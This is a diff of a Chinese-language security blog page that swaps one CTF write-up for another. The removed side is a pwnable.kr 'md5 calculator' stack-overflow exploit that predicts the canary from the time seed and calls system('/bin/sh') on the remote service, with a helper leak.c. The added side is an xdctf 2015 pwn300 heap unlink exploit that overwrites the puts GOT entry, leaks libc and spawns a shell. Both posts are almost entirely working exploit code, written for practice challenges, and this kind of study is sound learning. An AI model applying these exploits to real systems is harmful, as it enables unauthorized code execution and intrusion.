@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable," />
+  <meta name="keywords" content="Pwnable,练习," />
 
 
 
@@ -84,22 +84,19 @@
 
 
 
-<meta name="description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
-这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
-要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
+<meta name="description" content="Conclusion题目是自己写的malloc和free，最简单的unlink漏洞。本地测试
+Exploitfrom zio import *target  = &apos;./aa508d1df74d46a88bc02210c7f92824&apos;io      = zio(target, print_read = False, print_write = False, timeout = 100000)def">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-md5-calculator">
-<meta property="og:url" content="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/index.html">
+<meta property="og:title" content="xdctf-qual-2015-pwn300">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn300/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
-这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
-要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
-<meta property="og:updated_time" content="2016-08-09T16:00:30.000Z">
+<meta property="og:description" content="Conclusion题目是自己写的malloc和free，最简单的unlink漏洞。本地测试
+Exploitfrom zio import *target  = &apos;./aa508d1df74d46a88bc02210c7f92824&apos;io      = zio(target, print_read = False, print_write = False, timeout = 100000)def">
+<meta property="og:updated_time" content="2016-08-17T12:46:20.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-md5-calculator">
-<meta name="twitter:description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
-这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
-要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
+<meta name="twitter:title" content="xdctf-qual-2015-pwn300">
+<meta name="twitter:description" content="Conclusion题目是自己写的malloc和free，最简单的unlink漏洞。本地测试
+Exploitfrom zio import *target  = &apos;./aa508d1df74d46a88bc02210c7f92824&apos;io      = zio(target, print_read = False, print_write = False, timeout = 100000)def">
 
 
 
@@ -120,9 +117,9 @@
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn300/"/>
 
-  <title> pwnable.kr-rookiss-md5-calculator | Icemakr's Blog </title>
+  <title> xdctf-qual-2015-pwn300 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -292,7 +289,7 @@
             
             
               
-                pwnable.kr-rookiss-md5-calculator
+                xdctf-qual-2015-pwn300
               
             
           </h1>
@@ -304,8 +301,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
-              2016-08-09
+            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
+              2016-08-17
             </time>
           </span>
 
@@ -318,8 +315,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
                   </a>
                 </span>
 
@@ -334,8 +331,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/09/pwnable-rookiss-md5-calculator/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/09/pwnable-rookiss-md5-calculator/" itemprop="commentsCount"></span>
+                <a href="/2016/08/17/xdctf-qual-2015-pwn300/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/17/xdctf-qual-2015-pwn300/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -358,17 +355,8 @@
       
 
       
-        <h1 id="Conclusion">Conclusion</h1><p>之前第一次做没做出来，参考了<a href="https://gist.github.com/ihciah/948b37ab7587c3f70268" target="_blank" rel="external">@ihc童鞋</a>的题解，今天又重新做了一次。</p>
-<p>这个程序的bug出在<code>my_hash</code>函数的返回值泄露了<strong>canary</strong>的信息，并且<code>process_hash</code>函数存在栈上的缓冲区溢出</p>
-<p>要泄露<strong>canary</strong>的信息，关键在于程序中的<code>srand(time(0));</code>。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的<strong>captcha</strong>来算出<strong>canary</strong>。关于服务器的时间戳，我也是尝试了下，发现跟本机上跟服务器上差了不到10秒，再考虑到网络延时，所以对本机的时间戳叠加了个-10~10的随机数</p>
-<p>搞定了canary之后，后面的就很简单了</p>
-<h1 id="Trick">Trick</h1><ul>
-<li>不同函数的canary可能是相同的，可以通过泄露前面调用的函数的canary，然后用它来覆盖后面调用的函数的canary</li>
-</ul>
-<h1 id="Exploit">Exploit</h1><h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, base64, ctypes, time, urllib2, random</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./hash'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="comment"># leak info</span></span><br><span class="line">    leak    = os.popen(<span class="string">'./leak '</span> + str(int(time.time()) + random.randint(-<span class="number">10</span>, <span class="number">10</span>))).read().split(<span class="string">'*'</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    leak    = [int(l) <span class="keyword">for</span> l <span class="keyword">in</span> leak]</span><br><span class="line">    io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># calc canary</span></span><br><span class="line">    io.read_until(<span class="string">'input captcha : '</span>)</span><br><span class="line">    captcha = int(io.read_line()[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    canary  = captcha - leak[<span class="number">1</span>] - leak[<span class="number">2</span>] + leak[<span class="number">3</span>] - leak[<span class="number">4</span>] - leak[<span class="number">5</span>] + leak[<span class="number">6</span>] - leak[<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] leak canary : '</span> + hex(ctypes.c_uint32(canary).value)</span><br><span class="line"></span><br><span class="line">    io.writeline(str(captcha))</span><br><span class="line">    io.read_until(<span class="string">'Encode your data with BASE64 then paste me!'</span>)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x8048880</span></span><br><span class="line">    adr_gbuf    = <span class="number">0x804b0e0</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">0x200</span></span><br><span class="line">    payload += l32(canary)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0xc</span></span><br><span class="line">    payload += l32(plt_system)</span><br><span class="line">    payload += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += l32(adr_gbuf + <span class="number">0x2d1</span>)</span><br><span class="line"></span><br><span class="line">    io.writeline(base64.b64encode(payload) + <span class="string">'A/bin/sh'</span>)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
-<h2 id="leak-c">leak.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">8</span>];</span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        a[i] = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d*"</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<h1 id="Referance">Referance</h1><p><a href="https://gist.github.com/ihciah/948b37ab7587c3f70268" target="_blank" rel="external">https://gist.github.com/ihciah/948b37ab7587c3f70268</a></p>
+        <h2 id="Conclusion">Conclusion</h2><p>题目是自己写的malloc和free，最简单的<code>unlink</code>漏洞。本地测试</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./aa508d1df74d46a88bc02210c7f92824'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_girl</span><span class="params">(typ)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the type of the Girl:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to delete:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_girl</span><span class="params">(idx, typ, girl)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to edit:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Give the type to edit:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line">    io.read_until(<span class="string">'Give your Girl:'</span>)</span><br><span class="line">    io.writeline(girl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girlid to print:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts    = <span class="number">0x804b014</span></span><br><span class="line">adr_buf     = <span class="number">0x804b060</span></span><br><span class="line"></span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">add_girl(<span class="number">2</span>)</span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'A'</span> * (<span class="number">0xe0</span> - <span class="number">0xc</span>) + l32(adr_buf - <span class="number">8</span>) + l32(got_puts))</span><br><span class="line">edit_girl(<span class="number">2</span>, <span class="number">1</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_girl(<span class="number">1</span>)</span><br><span class="line">show_girl(<span class="number">0</span>)</span><br><span class="line">adr_puts = l32(io.read(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">off_puts    = <span class="number">0x00065650</span></span><br><span class="line">off_system  = <span class="number">0x00040190</span></span><br><span class="line">adr_libc    = adr_puts - off_puts</span><br><span class="line">adr_system  = adr_libc + off_system</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base : &#123;&#125;'</span>.format(hex(adr_libc))</span><br><span class="line"></span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">1</span>, l32(adr_system))</span><br><span class="line"></span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -393,6 +381,8 @@
           
             <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
+            <a href="/tags/练习/" rel="tag">#练习</a>
+          
         </div>
       
 
@@ -400,17 +390,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/08/pwnable-rookiss-alloca/" rel="next" title="pwnable.kr-rookiss-alloca">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-alloca
+              <a href="/2016/08/17/xdctf-qual-2015-pwn200/" rel="next" title="xdctf-qual-2015-pwn200">
+                <i class="fa fa-chevron-left"></i> xdctf-qual-2015-pwn200
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/09/pwnable-rookiss-fsb/" rel="prev" title="pwnable.kr-rookiss-fsb">
-                pwnable.kr-rookiss-fsb <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -542,7 +528,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">3.1.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-c"><span class="nav-number">3.2.</span> <span class="nav-text">leak.c</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
             
           </div>
         </section>
@@ -669,9 +655,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/08/09/pwnable-rookiss-md5-calculator/';
-      var disqus_title = "pwnable.kr-rookiss-md5-calculator";
-      var disqus_url = 'http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/';
+      var disqus_identifier = '2016/08/17/xdctf-qual-2015-pwn300/';
+      var disqus_title = "xdctf-qual-2015-pwn300";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn300/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
